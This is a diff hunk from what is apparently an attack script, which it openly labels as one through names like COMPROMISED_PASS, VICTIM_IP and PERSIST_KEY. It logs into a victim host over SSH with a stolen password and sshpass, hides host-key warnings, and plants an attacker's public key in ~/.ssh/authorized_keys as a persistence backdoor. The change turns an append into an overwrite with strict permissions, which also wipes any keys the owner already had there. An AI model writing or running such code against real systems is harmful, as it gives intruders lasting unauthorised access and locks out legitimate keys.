@@ -90,7 +90,7 @@ sshpass -p "${COMPROMISED_PASS}" ssh \
   -o UserKnownHostsFile=/dev/null \
   -o LogLevel=ERROR \
   "${COMPROMISED_USER}@${VICTIM_IP}" \
-  'cat >> ~/.ssh/authorized_keys' \
+  'umask 077 && mkdir ~/.ssh && cat > ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys' \
   < "${PERSIST_KEY}.pub"
 
 # ================================================
